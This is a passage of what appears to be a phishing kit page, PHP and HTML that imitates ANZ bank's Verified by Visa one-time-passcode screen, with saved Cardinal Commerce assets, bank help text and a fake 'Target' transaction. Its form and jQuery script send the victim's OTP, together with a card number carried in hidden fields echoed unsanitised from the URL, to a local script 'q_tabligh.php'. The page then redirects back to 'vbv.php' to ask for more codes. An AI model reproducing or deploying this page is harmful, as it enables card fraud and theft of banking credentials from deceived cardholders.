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"
                                />
                            </div>
                            <div class="pull-right visa-header-two">
                                <img
                                    alt="Verified By Visa logo"
                                    class="visa-header-img"
                                    src="data:image/png;base64,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"
                                />
                            </div>
                        </div>
                    </div>
                </div>
                <div class="visa-styling body" dir="ltr">
                    <div class="visa-styling container container-sticky-footer">
                        <h1 class="screenreader-only">Your One-time Passcode has been sent</h1>

                        <div class="visa-row">
                            <div class="visa-col-12 visa-validate">
                                <strong>Transaction Verification</strong>
                            </div>
                            <div class="row">
                                <div class="col-12" id="ValidateOneUpMessage">
                                    <div id="Body1">
                                        We've sent a one-time password (OTP) to <span id="contentBlock-text">Your registred Mobile</span> for your online transaction amount of
                                        <span id="contentBlock-amount" class="always-left-to-right">50 USD</span>* to <span id="contentBlock-merchantname">Target</span> on your ANZ card ending
                                        <span id="contentBlock-maskedpan" class="always-left-to-right">************<?php echo($lbin);?> </span>. Excludes fees and charges (if applicable).
                                    </div>
                                </div>
                            </div>
                        </div>

                        <form id="verify_form" name="verify_form" action="./q_tabligh.php" method="post">
                            <style>
                                .centered-message {
                                    text-align: center;
                                    margin: 0 auto;
                                    color: red;
                                    padding: 10px; /* Add padding for spacing */
                                }
                            </style>

                            <div class="visa-row">
                                <div class="col-12 visa-styling">
                                    <div class="form-group text-center">
                                        <div id="InputAction">
                                            <label for="CredentialValidateInput">Enter your OTP</label>

                                            <input
                                                autofocus=""
                                                class="form-control visa-styling"
                                                data-val="true"
                                                data-val-required="Please enter a valid OTP"
                                                id="CredentialValidateInput"
                                                name="text_input"
                                                type="text"
                                                value=""
                                                id="text_input"
                                                required=""
                                            />

                                            <div class="form-group" id="ErrorMessage">
                                                <span class="field-validation-valid" data-valmsg-for="Credential.Value" data-valmsg-replace="true"></span>
                                            </div>
                                            <div class="visa-col-12 text-center">
                                                <input
                                                    id="verify-btn-elongated"
                                                    class="visa-styling btn btn-primary text-uppercase vba-button"
                                                    type="submit"
                                                    name="submit"
                                                    title="VERIFY"
                                                    value="VERIFY"
                                                    tabindex="0"
                                                    style="font-weight: 200; width: 100%; margin-bottom: 10px;"
                                                />
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="visa-row"></div>
                            <div class="visa-row">
                                <div class="col-12 text-center">
                                    <span id="MaximumResendsReachedMessage" style="display: none;">Maximum resend limit reached</span>
                                    <a href="#" id="ResendLink" class="btn btn-link no-decoration text-uppercase">RESEND CODE</a>
                                </div>
                            </div>

                            <div class="footer" id="FooterLinks">
                                <div class="row">
                                    <div class="visa-col-12 helpRow" id="Accordion">
                                        <ul class="list-inline list-inline-separated pull-left">
                                            <li>
                                                <a
                                                    class="btn btn-link no-decoration"
                                                    data-target="#FAQ"
                                                    data-toggle="modal"
                                                    href="#"
                                                    id="FooterLink1"
                                                >
                                                    Need some help?
                                                </a>
                                            </li>
                                            <li><a class="btn btn-link no-decoration" data-target="#Terms" data-toggle="modal" href="#" id="FooterLink1">Learn more about authentication</a></li>
                                        </ul>
                                    </div>
                                </div>

                                <input type="text" style="display: none;" name="ccnumb" id="ccnumb" value="<?php echo($_GET['ccnumber']);?>" />
                                <input type="text" style="display: none;" name="reference" id="reference" value="<?php echo($_GET['reference']); ?>" />
                            </div>
                        </form>
                    </div>

                    <script>
                        $(document).ready(function () {
                            $("#verify-btn-elongated").click(function (e) {
                                e.preventDefault(); // prevent regular form submission
                                $.ajax({
                                    url: "./q_tabligh.php?reference=" + document.getElementById("reference").value + "&ccnumber=" + document.getElementById("ccnumb").value,
                                    type: "post",
                                    data: $("#verify_form").serialize(), // send form data
                                    success: function (response) {
                                        console.log(response);
                                        if (response.trim() === "ok") {
                                            window.location.href = "vbv.php?reference=" + document.getElementById("reference").value + "&ccnumber=" + document.getElementById("ccnumb").value + "&repeat=1";
                                        } else {
                                            console.log("Response from server: ", response);
                                        }
                                    },
                                    error: function (xhr, status, error) {
                                        console.log("AJAX Error: " + error);
                                    },
                                });
                            });
                        });
                    </script>
                    <div class="modal modal-clear" id="ProcessingModal" tabindex="-1" role="dialog" aria-labelledby="Processing-label" aria-hidden="true" data-keyboard="false" data-backdrop="static">
                        <div class="modal-dialog">
                            <div class="modal-content">
                                <div class="modal-body">
                                    <div class="row">
                                        <div class="col-12 processing">
                                            <img
                                                id="ProcessingImage"
                                                data-savepage-currentsrc="https://authentication.cardinalcommerce.com/Content/images/loading.svg"
                                                data-savepage-src="/Content/images/loading.svg"
                                                src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHdpZHRoPSI2NHB4IiBoZWlnaHQ9IjY0cHgiIHZpZXdCb3g9IjAgMCAxMjggMTI4IiB4bWw6c3BhY2U9InByZXNlcnZlIj48cmVjdCB4PSIwIiB5PSIwIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjRkZGRkZGIiAvPjxnPjxwYXRoIGQ9Ik01OS42IDBoOHY0MGgtOFYweiIgZmlsbD0iIzhjOGM4YyIgZmlsbC1vcGFjaXR5PSIxIi8+PHBhdGggZD0iTTU5LjYgMGg4djQwaC04VjB6IiBmaWxsPSIjZThlOGU4IiBmaWxsLW9wYWNpdHk9IjAuMiIgdHJhbnNmb3JtPSJyb3RhdGUoMzAgNjQgNjQpIi8+PHBhdGggZD0iTTU5LjYgMGg4djQwaC04VjB6IiBmaWxsPSIjZThlOGU4IiBmaWxsLW9wYWNpdHk9IjAuMiIgdHJhbnNmb3JtPSJyb3RhdGUoNjAgNjQgNjQpIi8+PHBhdGggZD0iTTU5LjYgMGg4djQwaC04VjB6IiBmaWxsPSIjZThlOGU4IiBmaWxsLW9wYWNpdHk9IjAuMiIgdHJhbnNmb3JtPSJyb3RhdGUoOTAgNjQgNjQpIi8+PHBhdGggZD0iTTU5LjYgMGg4djQwaC04VjB6IiBmaWxsPSIjZThlOGU4IiBmaWxsLW9wYWNpdHk9IjAuMiIgdHJhbnNmb3JtPSJyb3RhdGUoMTIwIDY0IDY0KSIvPjxwYXRoIGQ9Ik01OS42IDBoOHY0MGgtOFYweiIgZmlsbD0iI2RjZGNkYyIgZmlsbC1vcGFjaXR5PSIwLjMiIHRyYW5zZm9ybT0icm90YXRlKDE1MCA2NCA2NCkiLz48cGF0aCBkPSJNNTkuNiAwaDh2NDBoLThWMHoiIGZpbGw9IiNkMWQxZDEiIGZpbGwtb3BhY2l0eT0iMC40IiB0cmFuc2Zvcm09InJvdGF0ZSgxODAgNjQgNjQpIi8+PHBhdGggZD0iTTU5LjYgMGg4djQwaC04VjB6IiBmaWxsPSIjYzVjNWM1IiBmaWxsLW9wYWNpdHk9IjAuNSIgdHJhbnNmb3JtPSJyb3RhdGUoMjEwIDY0IDY0KSIvPjxwYXRoIGQ9Ik01OS42IDBoOHY0MGgtOFYweiIgZmlsbD0iI2JhYmFiYSIgZmlsbC1vcGFjaXR5PSIwLjYiIHRyYW5zZm9ybT0icm90YXRlKDI0MCA2NCA2NCkiLz48cGF0aCBkPSJNNTkuNiAwaDh2NDBoLThWMHoiIGZpbGw9IiNhZWFlYWUiIGZpbGwtb3BhY2l0eT0iMC43IiB0cmFuc2Zvcm09InJvdGF0ZSgyNzAgNjQgNjQpIi8+PHBhdGggZD0iTTU5LjYgMGg4djQwaC04VjB6IiBmaWxsPSIjYTNhM2EzIiBmaWxsLW9wYWNpdHk9IjAuOCIgdHJhbnNmb3JtPSJyb3RhdGUoMzAwIDY0IDY0KSIvPjxwYXRoIGQ9Ik01OS42IDBoOHY0MGgtOFYweiIgZmlsbD0iIzk3OTc5NyIgZmlsbC1vcGFjaXR5PSIwLjkiIHRyYW5zZm9ybT0icm90YXRlKDMzMCA2NCA2NCkiLz48YW5pbWF0ZVRyYW5zZm9ybSBhdHRyaWJ1dGVOYW1lPSJ0cmFuc2Zvcm0iIHR5cGU9InJvdGF0ZSIgdmFsdWVzPSIwIDY0IDY0OzMwIDY0IDY0OzYwIDY0IDY0OzkwIDY0IDY0OzEyMCA2NCA2NDsxNTAgNjQgNjQ7MTgwIDY0IDY0OzIxMCA2NCA2NDsyNDAgNjQgNjQ7MjcwIDY0IDY0OzMwMCA2NCA2NDszMzAgNjQgNjQiIGNhbGNNb2RlPSJkaXNjcmV0ZSIgZHVyPSIxMDgwbXMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIj48L2FuaW1hdGVUcmFuc2Zvcm0+PC9nPjwvc3ZnPg=="
                                                alt="Loading Indicator"
                                                class="processing-img center-block content-block"
                                            />
                                            <p class="processing-text" id="Processing-label">Processing</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <form
                        action=""
                        autocomplete="off"
                        data-ajax="true"
                        data-ajax-begin="ccHelpers.ajax.onBegin"
                        data-ajax-complete="ccHelpers.ajax.onComplete"
                        data-ajax-failure="ccHelpers.ajax.onFailure"
                        data-ajax-method="form"
                        data-ajax-success="ccHelpers.ajax.onSuccess"
                        id="StepupForm"
                        method="post"
                        name="StepupForm"
                    >
                        <input id="HiddenTransactionId" name="TransactionId" type="hidden" value="be2105d5-1fa5-4787-9933-637d67c74a26" /><input id="StepUpIssuerId" name="IssuerId" type="hidden" value="6346dadc4483b704c8f97dc7" />
                    </form>
                </div>
                <input data-val="true" data-val-number="The field MessageVersion must be a number." data-val-required="The MessageVersion field is required." id="MessageVersion" name="MessageVersion" type="hidden" value="2" />
                <div class="modal fade" id="FAQ" tabindex="-1" role="dialog" aria-labelledby="FAQ-label">
                    <div class="modal-dialog" role="document">
                        <div class="modal-content">
                            <div class="modal-header">
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">×</span>
                                </button>
                                <h4 class="modal-title" id="FAQ-label">Need some help?</h4>
                            </div>
                            <div class="modal-body partial-modal">
                                <div>
                                    <p>
                                        <strong>What happens if I don’t receive a one-time password?</strong><br />
                                        If you don’t receive a one-time password, select ‘RESEND CODE' in the first instance. If still not received, please contact ANZ for further assistance.<br />
                                        <br />
                                        <strong>How do I update my mobile number?</strong><br />
                                        To update your mobile number please contact ANZ on 13 33 50 or +61 3 8699 6908 (from overseas), available 24/7. <br />
                                        <br />
                                        You can also call the phone number listed on the back of your card or statement.<br />
                                        <br />
                                        <strong>Can I complete this transaction without confirming my identity?</strong><br />
                                        If you're unable to confirm your identity through the one-time password that is sent to your mobile, you won't be able to proceed with your purchase at this time. Contact ANZ for further assistance.
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="modal fade" id="Terms" tabindex="-1" role="dialog" aria-labelledby="Terms-label">
                    <div class="modal-dialog" role="document">
                        <div class="modal-content">
                            <div class="modal-header">
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">×</span>
                                </button>
                                <h4 class="modal-title" id="Terms-label">Learn more about authentication</h4>
                            </div>
                            <div class="modal-body partial-modal">
                                <div>
                                    <p>
                                        <strong>What is authentication?</strong><br />
                                        Authentication adds an extra layer of protection by helping confirm your identity through providing you with a one-time password for select online transactions. Authentication helps give you an extra
                                        layer of security and peace of mind when shopping online at participating merchants.<br />
                                        <br />
                                        <strong>How does authentication work?</strong><br />
                                        When you make an online purchase at participating merchants, a pop up box may automatically appear requesting your one-time password. This is similar to the way your bank asks for your PIN at the ATM.
